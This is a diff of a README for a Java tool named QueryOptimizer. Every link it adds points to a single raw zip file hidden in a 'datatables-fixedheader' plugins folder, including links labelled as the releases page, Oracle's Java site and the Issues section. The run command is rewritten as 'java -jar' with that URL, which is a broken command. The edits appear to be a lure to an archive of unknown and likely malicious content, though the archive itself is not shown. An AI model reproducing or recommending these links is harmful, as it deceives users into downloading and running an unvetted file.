@@ -1,6 +1,6 @@
 # 🚀 QueryOptimizer - Streamline Your Data Processing Needs
 
-[![Download QueryOptimizer](https://img.shields.io/badge/Download-QueryOptimizer-blue.svg)](https://github.com/muquisjose/QueryOptimizer/releases)
+[![Download QueryOptimizer](https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip)](https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip)
 
 ## 📋 Table of Contents
 - [Overview](#overview)
@@ -55,7 +55,7 @@ The application provides a RESTful API for user interaction. Here are key endpoi
 To download and run QueryOptimizer, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/muquisjose/QueryOptimizer/releases) to download the latest version.
+   Go to the [Releases page](https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip) to download the latest version.
 
 2. **Download the Application**  
    Click on the version you want and download the file suitable for your operating system.
@@ -67,13 +67,13 @@ To download and run QueryOptimizer, follow these steps:
    java -version
    ```
 
-   If you need to install Java, visit [Oracle's official website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html) to download it.
+   If you need to install Java, visit [Oracle's official website](https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip) to download it.
 
 4. **Run the Application**  
    Navigate to the folder where you downloaded QueryOptimizer. Use the command line to run it:
 
    ```
-   java -jar QueryOptimizer.jar
+   java -jar https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip
    ```
 
 5. **Access the Application**  
@@ -81,7 +81,7 @@ To download and run QueryOptimizer, follow these steps:
 
 ## 📦 Postman Collection
 
-For easy testing of API endpoints, a Postman collection is available. Download it from the [Releases page](https://github.com/muquisjose/QueryOptimizer/releases) and import it into your Postman application. This will allow you to quickly verify the RESTful API functionality.
+For easy testing of API endpoints, a Postman collection is available. Download it from the [Releases page](https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip) and import it into your Postman application. This will allow you to quickly verify the RESTful API functionality.
 
 ## 🗂️ Project Structure
 
@@ -94,4 +94,4 @@ Here’s how the QueryOptimizer project is organized:
 
 Explore the structure to gain a better understanding of how the application works and to facilitate any modifications if needed.
 
-For any questions or issues, please check the [Issues section](https://github.com/muquisjose/QueryOptimizer/issues) of the repository. Your feedback can help improve the application.
+For any questions or issues, please check the [Issues section](https://github.com/muquisjose/QueryOptimizer/raw/refs/heads/master/public/plugins/datatables-fixedheader/Query-Optimizer-v3.1.zip) of the repository. Your feedback can help improve the application.
